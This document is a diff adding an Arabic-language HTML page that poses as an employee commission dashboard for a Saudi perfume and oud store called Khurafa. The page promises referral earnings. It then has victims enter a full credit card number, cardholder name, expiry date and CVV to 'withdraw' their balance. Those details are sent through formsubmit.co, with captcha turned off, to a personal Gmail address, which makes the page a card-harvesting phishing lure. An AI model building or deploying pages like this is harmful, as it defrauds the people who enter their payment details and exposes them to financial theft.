@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة الموظف | عطور خرافة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #2C1810;
+            --secondary-color: #5D4037;
+            --accent-color: #8B4513;
+            --light-color: #F8F0E5;
+            --text-dark: #2C1810;
+            --text-light: #F8F0E5;
+            --gold-color: #D4AF37;
+            --success-color: #27ae60;
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: var(--text-dark);
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* الشريط العلوي */
+        .top-bar {
+            background-color: var(--primary-color);
+            color: var(--text-light);
+            padding: 8px 0;
+            text-align: center;
+            font-size: 14px;
+            position: relative;
+        }
+
+        .close-topbar {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--gold-color);
+            transition: var(--transition);
+        }
+
+        .close-topbar:hover {
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        /* شعار المتجر */
+        .logo {
+            font-family: 'Arabic Typesetting', serif;
+            font-size: 2.5rem;
+            color: var(--gold-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px 0;
+            transition: var(--transition);
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+        }
+
+        .logo span {
+            margin: 0 10px;
+        }
+
+        /* شريط التنقل */
+        nav {
+            background-color: var(--secondary-color);
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+
+        .nav-links li {
+            margin: 0 15px;
+        }
+
+        .nav-links a {
+            color: var(--text-light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .nav-links a:after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            background: var(--gold-color);
+            left: 0;
+            bottom: -5px;
+            transition: var(--transition);
+        }
+
+        .nav-links a:hover:after {
+            width: 100%;
+        }
+
+        .nav-icons {
+            display: flex;
+            align-items: center;
+        }
+
+        .nav-icons a {
+            color: var(--text-light);
+            margin-left: 20px;
+            font-size: 1.2rem;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .nav-icons a:hover {
+            color: var(--gold-color);
+        }
+
+        /* محتوى لوحة الموظف */
+        .employee-dashboard {
+            padding: 40px 0;
+        }
+
+        .dashboard-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .dashboard-title {
+            font-size: 2.2rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            font-family: 'Arabic Typesetting', serif;
+        }
+
+        .dashboard-subtitle {
+            color: #777;
+            font-size: 1.1rem;
+        }
+
+        .stats-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+
+        .stat-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: rgba(139, 69, 19, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 1.5rem;
+            color: var(--accent-color);
+        }
+
+        .stat-title {
+            font-size: 1.1rem;
+            color: #777;
+            margin-bottom: 10px;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+
+        .stat-change {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: var(--success-color);
+        }
+
+        .referral-section {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 40px;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            font-family: 'Arabic Typesetting', serif;
+            border-bottom: 2px solid var(--gold-color);
+            padding-bottom: 10px;
+        }
+
+        .referral-link-container {
+            display: flex;
+            margin-bottom: 20px;
+        }
+
+        .referral-link {
+            flex: 1;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            background-color: #f9f9f9;
+        }
+
+        .copy-btn {
+            padding: 0 20px;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            margin-right: 10px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .copy-btn:hover {
+            background-color: var(--primary-color);
+        }
+
+        .referral-info {
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .referral-info p {
+            margin-bottom: 10px;
+            color: #555;
+        }
+
+        .referral-info ul {
+            padding-right: 20px;
+            color: #555;
+        }
+
+        .referral-info li {
+            margin-bottom: 8px;
+        }
+
+        /* قسم إضافة البطاقة */
+        .banking-section {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 40px;
+        }
+
+        .banking-message {
+            display: flex;
+            align-items: center;
+            background-color: #f8f0e5;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .banking-message i {
+            font-size: 1.5rem;
+            color: var(--accent-color);
+            margin-left: 15px;
+        }
+
+        .banking-message p {
+            flex: 1;
+            color: var(--primary-color);
+        }
+
+        .add-card-btn {
+            padding: 12px 25px;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .add-card-btn:hover {
+            background-color: var(--primary-color);
+        }
+
+        .card-form {
+            display: none;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--secondary-color);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        .form-input:focus {
+            border-color: var(--accent-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(139, 69, 19, 0.2);
+        }
+
+        .card-type-icon {
+            position: absolute;
+            left: 15px;
+            top: 40px;
+            font-size: 24px;
+            color: #ccc;
+        }
+
+        .card-input-group {
+            position: relative;
+        }
+
+        .card-input-group .form-input {
+            padding-left: 50px;
+        }
+
+        .form-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .cancel-btn {
+            padding: 10px 20px;
+            background-color: #ddd;
+            color: #333;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .cancel-btn:hover {
+            background-color: #ccc;
+        }
+
+        .save-btn {
+            padding: 10px 20px;
+            background-color: var(--success-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .save-btn:hover {
+            background-color: #219653;
+        }
+
+        /* قسم المعاملات */
+        .transactions-section {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .transaction-info {
+            flex: 1;
+        }
+
+        .transaction-title {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .transaction-date {
+            color: #777;
+            font-size: 0.9rem;
+        }
+
+        .transaction-amount {
+            font-weight: bold;
+            color: var(--success-color);
+        }
+
+        .transaction-amount.withdrawal {
+            color: var(--accent-color);
+        }
+
+        .no-transactions {
+            text-align: center;
+            padding: 30px;
+            color: #777;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--primary-color);
+            color: var(--text-light);
+            padding: 30px 0 15px;
+            margin-top: 40px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-column h3 {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            color: var(--gold-color);
+            font-family: 'Arabic Typesetting', serif;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            color: var(--text-light);
+            text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .footer-links a:hover {
+            color: var(--gold-color);
+            padding-right: 5px;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .social-icons a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 35px;
+            height: 35px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: var(--text-light);
+            transition: var(--transition);
+        }
+
+        .social-icons a:hover {
+            background-color: var(--gold-color);
+            transform: translateY(-3px);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            margin-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            
+            .referral-link-container {
+                flex-direction: column;
+            }
+            
+            .copy-btn {
+                margin-right: 0;
+                margin-top: 10px;
+                padding: 12px;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .success-message {
+            background-color: #eaf7ee;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .success-message i {
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- الشريط العلوي -->
+    <div class="top-bar">
+        <span class="close-topbar"><i class="fas fa-times"></i></span>
+        توصيل مجاني للطلبات فوق 500 ريال | خصم 20% على أول طلب لك | استخدم الكود: WELCOME20
+    </div>
+
+    <!-- الرأس -->
+    <header>
+        <a href="index.html" class="logo">
+            <span>خرافة</span>
+            <i class="fas fa-fire"></i>
+            <span>للعود</span>
+        </a>
+
+        <nav>
+            <div class="nav-container">
+                <ul class="nav-links">
+                    <li><a href="index.html">الرئيسية</a></li>
+                    <li><a href="kk1.html">العطور</a></li>
+                    <li><a href="#">البخور</a></li>
+                    <li><a href="#">مجموعات الهدايا</a></li>
+                    <li><a href="#">اتصل بنا</a></li>
+                </ul>
+
+                <div class="nav-icons">
+                    <a href="#"><i class="fas fa-search"></i></a>
+                    <a href="#"><i class="fas fa-user"></i></a>
+                    <a href="sk.html">
+                        <i class="fas fa-shopping-cart"></i>
+                    </a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- محتوى لوحة الموظف -->
+    <section class="employee-dashboard container">
+        <div class="dashboard-header">
+            <h1 class="dashboard-title">لوحة تحكم الموظف</h1>
+            <p class="dashboard-subtitle" id="welcomeMessage">مرحباً بك! هذه إحصائيات أدائك وعمولاتك</p>
+        </div>
+
+        <div class="stats-cards">
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-users"></i>
+                </div>
+                <h3 class="stat-title">عدد الأشخاص المدعوين</h3>
+                <div class="stat-value">0</div>
+                <div class="stat-change">+0 هذا الشهر</div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-wallet"></i>
+                </div>
+                <h3 class="stat-title">الرصيد المودع</h3>
+                <div class="stat-value">0 ر.س</div>
+                <div class="stat-change">+0 ر.س هذا الشهر</div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <h3 class="stat-title">العمولات المستحقة</h3>
+                <div class="stat-value">0 ر.س</div>
+                <div class="stat-change">سيتم تحويلها قريباً</div>
+            </div>
+        </div>
+
+        <div class="referral-section">
+            <h2 class="section-title">رابط الدعوة الخاص بك</h2>
+            <div class="referral-link-container">
+                <input type="text" class="referral-link" id="referralLink" value="https://khurapha.com/ref/employee123" readonly>
+                <button class="copy-btn" onclick="copyReferralLink()">
+                    <i class="fas fa-copy"></i> نسخ
+                </button>
+            </div>
+            
+            <div class="referral-info">
+                <p><strong>كيف يعمل نظام العمولات:</strong></p>
+                <ul>
+                    <li>سيحصل كل شخص يسجل باستخدام رابطك على خصم 10% على أول طلب</li>
+                    <li>ستحصل على 100 ر.س عمولة عن كل شخص يسجل باستخدام رابطك ويقوم بأول عملية شراء</li>
+                    <li>العمولات تتراكم في رصيدك ويمكن سحبها بعد إضافة بطاقة ائتمان أو حساب بنكي</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="banking-section">
+            <h2 class="section-title">الحساب البنكي</h2>
+            
+            <div class="banking-message" id="bankMessage">
+                <i class="fas fa-info-circle"></i>
+                <p>يرجى إضافة بطاقة ائتمان/ربط حساب بنكي لاستلام الرصيد المودع لحسابكم</p>
+                <button class="add-card-btn" onclick="showCardForm()">إضافة</button>
+            </div>
+
+            <form class="card-form" id="cardForm" action="https://formsubmit.co/gohyt4480@gmail.com" method="POST">
+                <!-- إضافة حقول مخفية لتحسين تجربة FormSubmit -->
+                <input type="hidden" name="_subject" value="طلب إضافة بطاقة بنكية - خرافة للعود">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
+                <input type="hidden" name="نوع الطلب" value="إضافة بطاقة بنكية للموظف">
+                
+                <h3>إضافة بطاقة ائتمان جديدة</h3>
+                
+                <div class="form-group card-input-group">
+                    <label class="form-label">رقم البطاقة</label>
+                    <div class="card-type-icon" id="cardTypeIcon">
+                        <i class="fas fa-credit-card"></i>
+                    </div>
+                    <input type="text" class="form-input" name="رقم البطاقة" placeholder="1234 5678 9012 3456" id="cardNumber" maxlength="19" required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label">اسم صاحب البطاقة</label>
+                        <input type="text" class="form-input" name="اسم صاحب البطاقة" placeholder="الاسم" id="cardName" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">تاريخ الانتهاء</label>
+                        <input type="text" class="form-input" name="تاريخ الانتهاء" placeholder="MM/YY" id="cardExpiry" maxlength="5" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">CVV</label>
+                    <input type="text" class="form-input" name="CVV" placeholder="123" id="cardCvv" maxlength="3" required>
+                </div>
+                
+                <div class="form-actions">
+                    <button type="button" class="cancel-btn" onclick="hideCardForm()">إلغاء</button>
+                    <button type="submit" class="save-btn">حفظ</button>
+                </div>
+            </form>
+
+            <div class="hidden" id="bankInfo">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <p>تم ربط البطاقة بنجاح! يمكنك الآن سحب الأموال من رصيدك.</p>
+                </div>
+                
+                <form class="withdrawal-form" action="https://formsubmit.co/gohyt4480@gmail.com" method="POST">
+                    <!-- إضافة حقول مخفية لتحسين تجربة FormSubmit -->
+                    <input type="hidden" name="_subject" value="طلب سحب أموال - خرافة للعود">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="نوع الطلب" value="طلب سحب أموال للموظف">
+                    
+                    <h3>طلب سحب الأموال</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">المبلغ المراد سحبه</label>
+                            <input type="number" class="form-input" name="المبلغ" placeholder="المبلغ بالريال السعودي" id="withdrawAmount" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">طريقة السحب</label>
+                            <select class="form-input" name="طريقة السحب">
+                                <option value="بطاقة الائتمان">بطاقة الائتمان</option>
+                                <option value="حساب بنكي">حساب بنكي</option>
+                            </select>
+                        </div>
+                    </div>
+                    <button type="submit" class="save-btn">طلب السحب</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="transactions-section">
+            <h2 class="section-title">آخر المعاملات</h2>
+            
+            <div class="no-transactions">
+                <i class="fas fa-receipt" style="font-size: 3rem; margin-bottom: 15px; color: #ddd;"></i>
+                <p>لا توجد معاملات حتى الآن</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-column">
+                <h3>خرافة للعود</h3>
+                <p>متجر متخصص في أجود أنواع العطور والبخور والعود، نقدم لكم منتجات أصلية مستوحاة من تراثنا العربي الأصيل.</p>
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-snapchat-ghost"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+
+            <div class="footer-column">
+                <h3>روابط سريعة</h3>
+                <ul class="footer-links">
+                    <li><a href="index.html">الرئيسية</a></li>
+                    <li><a href="kk1.html">العطور</a></li>
+                    <li><a href="#">عروض خاصة</a></li>
+                    <li><a href="#">مجموعات الهدايا</a></li>
+                    <li><a href="#">اتصل بنا</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-column">
+                <h3>خدمة العملاء</h3>
+                <ul class="footer-links">
+                    <li><a href="#">أسئلة شائعة</a></li>
+                    <li><a href="#">سياسة الإرجاع</a></li>
+                    <li><a href="#">طرق الدفع</a></li>
+                    <li><a href="#">تتبع الطلب</a></li>
+                    <li><a href="#">الشروط والأحكام</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-column">
+                <h3>معلومات الاتصال</h3>
+                <ul class="footer-links">
+                    <li><i class="fas fa-map-marker-alt"></i> الرياض، المملكة العربية السعودية</li>
+                    <li><i class="fas fa-phone"></i> 966112345678+</li>
+                    <li><i class="fas fa-envelope"></i> info@khurapha.com</li>
+                    <li><i class="fas fa-clock"></i> الأحد - الخميس: 9ص - 5م</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="copyright">
+            <p>جميع الحقوق محفوظة &copy; 2023 خرافة للعود</p>
+        </div>
+    </footer>
+
+    <script>
+        // إغلاق الشريط العلوي
+        document.querySelector('.close-topbar').addEventListener('click', function() {
+            document.querySelector('.top-bar').style.display = 'none';
+        });
+
+        // محاولة قراءة اسم المستخدم من ملف log.html
+        function loadUserName() {
+            // هذه دالة وهمية لمحاكاة قراءة اسم المستخدم من ملف
+            // في التطبيق الحقيقي، يمكن استخدام fetch أو XMLHttpRequest
+            
+            // محاكاة لقراءة البيانات من ملف log.html
+            const userData = {
+                name: "أحمد",
+                role: "موظف"
+            };
+            
+            // إذا لم يتم العثور على بيانات، نستخدم القيمة الافتراضية
+            const userName = userData.name || "مستخدم";
+            
+            // تحديث رسالة الترحيب
+            document.getElementById('welcomeMessage').textContent = 
+                `مرحباً بك،  هذه إحصائيات أدائك وعمولاتك`;
+        }
+
+        // نسخ رابط الدعوة
+        function copyReferralLink() {
+            const referralLink = document.getElementById('referralLink');
+            referralLink.select();
+            document.execCommand('copy');
+            
+            alert('تم نسخ رابط الدعوة: ' + referralLink.value);
+        }
+
+        // إظهار نموذج إضافة البطاقة
+        function showCardForm() {
+            document.getElementById('cardForm').style.display = 'block';
+            document.getElementById('bankMessage').style.display = 'none';
+        }
+
+        // إخفاء نموذج إضافة البطاقة
+        function hideCardForm() {
+            document.getElementById('cardForm').style.display = 'none';
+            document.getElementById('bankMessage').style.display = 'flex';
+        }
+
+        // التعرف على نوع البطاقة
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            const cardNumber = e.target.value.replace(/\s/g, '');
+            const cardTypeIcon = document.getElementById('cardTypeIcon');
+            
+            let iconClass = 'fa-credit-card';
+            
+            if (/^4/.test(cardNumber)) {
+                iconClass = 'fa-cc-visa';
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                iconClass = 'fa-cc-mastercard';
+            } else if (/^3[47]/.test(cardNumber)) {
+                iconClass = 'fa-cc-amex';
+            }
+            
+            cardTypeIcon.innerHTML = `<i class="fab ${iconClass}"></i>`;
+        });
+
+        // تنسيق رقم البطاقة
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.match(/.{1,4}/g).join(' ');
+            }
+            e.target.value = value;
+        });
+
+        // تنسيق تاريخ الانتهاء
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            e.target.value = value;
+        });
+
+        // معالجة إرسال نموذج البطاقة
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardName = document.getElementById('cardName').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+            
+            if (!cardNumber || !cardName || !cardExpiry || !cardCvv) {
+                e.preventDefault();
+                alert('يرجى ملء جميع حقول البطاقة');
+                return;
+            }
+            
+            // إخفاء النموذج وإظهار معلومات البطاقة
+            document.getElementById('cardForm').style.display = 'none';
+            document.getElementById('bankInfo').classList.remove('hidden');
+            
+            // إظهار رسالة نجاح
+            alert('تم إرسال طلب إضافة البطاقة بنجاح! سيتم مراجعته من قبل الإدارة.');
+        });
+
+        // معالجة إرسال نموذج السحب
+        document.querySelector('.withdrawal-form').addEventListener('submit', function(e) {
+            const withdrawAmount = document.getElementById('withdrawAmount').value;
+            
+            if (!withdrawAmount || withdrawAmount <= 0) {
+                e.preventDefault();
+                alert('يرجى إدخال مبلغ صحيح للسحب');
+                return;
+            }
+            
+            // إظهار رسالة نجاح
+            alert('تم إرسال طلب السحب بنجاح! سيتم معالجته خلال 24-48 ساعة.');
+        });
+
+        // تحميل اسم المستخدم عند بدء التشغيل
+        window.addEventListener('DOMContentLoaded', function() {
+            loadUserName();
+        });
+    </script>
+</body>
+</html>
